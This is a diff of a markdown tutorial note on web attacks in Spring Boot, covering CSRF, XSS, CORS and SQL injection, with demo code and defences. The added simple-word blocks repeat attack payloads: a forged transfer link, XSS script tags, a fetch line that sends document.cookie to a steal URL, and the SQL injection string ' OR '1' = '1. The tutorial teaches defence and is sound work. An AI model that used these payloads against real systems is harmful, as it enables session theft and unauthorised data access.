@@ -1,7 +1,7 @@
 # Common Attacks with Demo (HLD #32 / Spring Boot Security "Attacks")
 
 <!-- nav -->
-⬅ [28 API Gateway Concepts](28_API_Gateway_Concepts_Notes.md) · [Index](00_HLD_Index.md) · [33 Dual Write Problem](33_Dual_Write_Problem_Notes.md) ➡
+⬅ [30 DNS](30_DNS_Notes.md) · [Index](00_HLD_Index.md) · [33 Dual Write Problem](33_Dual_Write_Problem_Notes.md) ➡
 <!-- nav -->
 
 Source: https://drive.google.com/file/d/1JINOQHR7j2B-R_9IaduT6wDn1MLpKfTX/view?usp=drive_link
@@ -9,44 +9,6 @@ Source: https://drive.google.com/file/d/1JINOQHR7j2B-R_9IaduT6wDn1MLpKfTX/view?u
 Before starting Spring Security, understand the common web attacks: **CSRF, XSS, CORS (not an attack), SQL Injection** – what each is, a demo of the vulnerability, and how to protect against it.
 
 ---
-
-<!-- simple-explanation -->
-## In simple words – common web attacks and how to stop them
-
-Before learning Spring Security it helps to understand *what* it is protecting you from. Here are four ideas, each with an everyday explanation.
-
-### 1. CSRF – Cross-Site Request Forgery ("tricking your browser")
-**Situation:** you are logged in to your bank in one tab. The browser **automatically attaches your cookie/session** to every request going to the bank.
-**Attack:** you open a malicious page with a button like **"Claim My Money"**. The button secretly points to `http://bank/transfer?amount=1000&to=attacker`. You click it, your browser sends the request **with your valid session cookie**, and the bank thinks *you* asked for the transfer.
-**Why it works:** the server can't tell whether the request really came from its own page or from someone else's page.
-**Defence:** a **CSRF token**, a random value the server puts into its own forms and then expects back in every state-changing request. The attacker's page can't know the token, so the forged request is rejected. (It mainly matters for session/cookie-based, stateful logins.)
-
-### 2. XSS – Cross-Site Scripting ("planting a script on a page")
-**Situation:** a site lets users post comments and shows them to everybody.
-**Attack:** the attacker posts a comment that contains code, e.g. `<script>…</script>`. If the site displays it **without cleaning it**, every visitor's browser runs that script. The script can show pop-ups, deface the page, or **steal the visitor's cookie** (including the session ID) and send it to the attacker, who can then act as that user.
-**Defence:**
-- **Escape output:** turn special characters into harmless text (`<` becomes `&lt;`) so the browser displays them instead of running them. In the demo, use `th:text` instead of `th:utext`.
-- **Validate input** before accepting it.
-
-### 3. CORS – Cross-Origin Resource Sharing (a safety rule, *not* an attack)
-An **origin** is **protocol + domain + port**. `https://localhost:8080` and `http://localhost:8080` are different origins (protocol differs), and so are different ports or sub-domains.
-By default, browsers **block a web page from calling a server on a different origin**, to protect users. If your frontend and backend legitimately live on different origins, the **server must explicitly allow** the frontend by sending headers like `Access-Control-Allow-Origin`. In Spring you configure the allowed origins, methods and headers. Don't allow everything (`*`) unless the API is truly public.
-
-### 4. SQL Injection ("input that rewrites your query")
-**Unsafe code** builds SQL by gluing text together:
-`"SELECT * FROM user_details WHERE user_name = '" + name + "'"`
-**Attack:** the user types `' OR '1' = '1` as the name. The query becomes `… WHERE user_name = '' OR '1' = '1'`, which is always true, so **all rows** are returned. Attackers can use the same trick to read, change or delete data.
-**Defence:** use **parameterized queries** (prepared statements): `WHERE user_name = :name` and pass the value separately. The database treats the input purely as **data**, never as SQL, so the same attack returns nothing.
-
-### Summary
-| Attack | Core idea | Defence |
-|---|---|---|
-| CSRF | Browser sends your cookies to a request you didn't intend | CSRF token |
-| XSS | Attacker's script runs in other users' browsers | Escape output, validate input |
-| CORS | Browser blocks cross-origin calls unless the server allows | Whitelist trusted origins |
-| SQL injection | Input changes the SQL meaning | Parameterized queries |
-<!-- simple-explanation -->
-
 
 ## 1. CSRF – Cross-Site Request Forgery
 
@@ -85,6 +47,13 @@ public class UserController {
     public String hello() { return "hello"; }
 }
 ```
+
+<!-- isw:32-1 -->
+**In simple words**
+
+In the CSRF demo authentication is mandatory for all endpoints and the app uses **sessions (stateful).** There is a `GET /transfer` endpoint taking an `amount` and a `to` and a `GET /` endpoint returning "hello", under a `SecurityConfig` that requires authentication for every request and uses form login.
+<!-- /isw:32-1 -->
+
 
 ### Attack steps
 
@@ -144,9 +113,32 @@ sequenceDiagram
 ```
 As soon as the user clicks **"Claim My Money"**, an **unwanted operation is executed** – and the **browser automatically appends the cookies/session** to the request.
 
+<!-- isw:32-2 -->
+**In simple words**
+
+(1) Make the user **authenticated** on the server. (2) Send a **malicious link or page** to this authenticated user. The sample page has a button **"Claim My Money"** that links to `http://localhost:8080/transfer?amount=1000&to=attacker`. As soon as the user clicks it, **an unwanted operation is executed,** and the **browser automatically adds the cookies / session** to the request.
+<!-- /isw:32-2 -->
+
+
 ### Protection
 - Use a **CSRF token** – ensures the request **originates from the legitimate source**.
 - Authenticated forms / the website append the CSRF token to the request; the server validates it against the token created at **HTTP session creation time**.
+
+<!-- isw:32-0 -->
+**In simple words**
+
+The user is **already authenticated** to a site. A CSRF attack **tricks the browser into making an unwanted request** to a site where the user is already authenticated. It applies where **state / session is managed** (stateful, cookie or session-based authentication).
+<!-- /isw:32-0 -->
+
+<!-- isw:32-3 -->
+**In simple words**
+
+Use a **CSRF token,** which ensures the request **comes from the legitimate source.** The authenticated forms or website add the CSRF token to the request, and the server validates it against the token created at **HTTP session creation time.**
+<!-- /isw:32-3 -->
+
+
+
+
 
 ---
 
@@ -199,6 +191,14 @@ public class TestXSS {
 </body>
 </html>
 ```
+
+<!-- isw:32-5 -->
+**In simple words**
+
+The demo: `GET /xss` loads all comments and returns `"xss"`; since it is a `@Controller` (not a `@RestController`) it looks for **xss.html** and renders it. `POST /comment` **does not sanitise the user input;** it stores the comment (for example in a DB) and shows it on the next GET. So if an attacker posts a malicious script, **every GET call runs that script for all users.**
+<!-- /isw:32-5 -->
+
+
 ### Attack
 - Insert `<script>alert("XSS Attack")</script>` and submit → the script is stored (e.g. in DB); when the comments are fetched and returned, **the browser executes it**.
 - Worse – cookie theft:
@@ -209,9 +209,32 @@ public class TestXSS {
 ```
   Any user who loads the comments page has their **cookie sent to the attacker's URL**. That cookie holds the **JSESSIONID**, which the attacker can use to perform unwanted operations in the victim's active session.
 
+<!-- isw:32-6 -->
+**In simple words**
+
+Posting `<script>alert("XSS Attack")</script>` stores the script, and when the comments are fetched and returned **the browser executes it.** Worse is **cookie theft:** a script such as `fetch('http://localhost:8080/steal?cookie=' + document.cookie)` sends the **cookie of every user who loads the comments page to the attacker's URL.** That cookie holds the **JSESSIONID,** which the attacker can use to do unwanted operations in the victim's active session.
+<!-- /isw:32-6 -->
+
+
 ### Protection
 - **Properly escape user input** (convert special characters, e.g. `<` → `&lt;`) – e.g. use `th:text` instead of `th:utext`.
 - **Properly validate data** before rendering.
+
+<!-- isw:32-4 -->
+**In simple words**
+
+XSS lets an attacker **inject a malicious script into a web page viewed by other users** (for example a comments section). It is commonly used to **steal sessions** or **deface the website.**
+<!-- /isw:32-4 -->
+
+<!-- isw:32-7 -->
+**In simple words**
+
+**Properly escape user input** (convert special characters, for example `<` → `&lt;`), for example by using `th:text` instead of `th:utext`, and **properly validate the data** before rendering it.
+<!-- /isw:32-7 -->
+
+
+
+
 
 ---
 
@@ -265,6 +288,15 @@ public class SecurityConfig {
 }
 ```
 
+<!-- isw:32-8 -->
+**In simple words**
+
+CORS is **not an attack;** it is a **security feature** that restricts web pages from making requests to a **different origin** unless the server allows it. **An origin = protocol + domain + port.** Examples of *different* origins: `https://localhost:8080` vs `http://localhost:8080` (different **protocol**), `https://localhost:9090` vs `https://localhost:8080` (different **port**), `https://sub.localhost:9090` vs `https://localhost:9090` (different **domain / sub-domain**).
+
+By default, a client calling a server on a different origin is **blocked by CORS.** The **server has to allow** the request (for example from a given frontend) by setting **`Access-Control-Allow-Origin`** and other headers. The `SecurityConfig` shown in the notes does this with `.cors(...)`, setting the allowed origins, methods, headers and credentials.
+<!-- /isw:32-8 -->
+
+
 ---
 
 ## 4. SQL Injection
@@ -313,6 +345,22 @@ public List<UserDetails> findByName(String name) {
 ```
 With the same input `' OR '1' = '1`, the response is now an **empty list `[]`** – the input is treated as data, not SQL.
 
+<!-- isw:32-9 -->
+**In simple words**
+
+SQL injection means the attacker **manipulates the SQL query by inserting malicious input into a user field.** The demo has a `/find?name=…` endpoint, and the **unsafe query** is built by string concatenation: `"SELECT * FROM user_details WHERE user_name = '" + name + "'"`. **Calling `/find?name=' OR '1' = '1` makes the condition always true,** so it **returns all rows** of `user_details` (the demo table had two users, `AA` phone 111 and `BB` phone 222, and both were returned).
+<!-- /isw:32-9 -->
+
+<!-- isw:32-10 -->
+**In simple words**
+
+Use a **parameterized query:** `WHERE user_name = :name` with `.setParameter("name", name)`. With the same input `' OR '1' = '1` the response is now an **empty list `[]`,** because the input is treated as **data, not SQL.**
+<!-- /isw:32-10 -->
+
+
+
+
+
 ---
 
 ## Quick revision
@@ -326,5 +374,5 @@ With the same input `' OR '1' = '1`, the response is now an **empty list `[]`** 
 ---
 
 <!-- nav -->
-⬅ [28 API Gateway Concepts](28_API_Gateway_Concepts_Notes.md) · [Index](00_HLD_Index.md) · [33 Dual Write Problem](33_Dual_Write_Problem_Notes.md) ➡
+⬅ [30 DNS](30_DNS_Notes.md) · [Index](00_HLD_Index.md) · [33 Dual Write Problem](33_Dual_Write_Problem_Notes.md) ➡
 <!-- nav -->
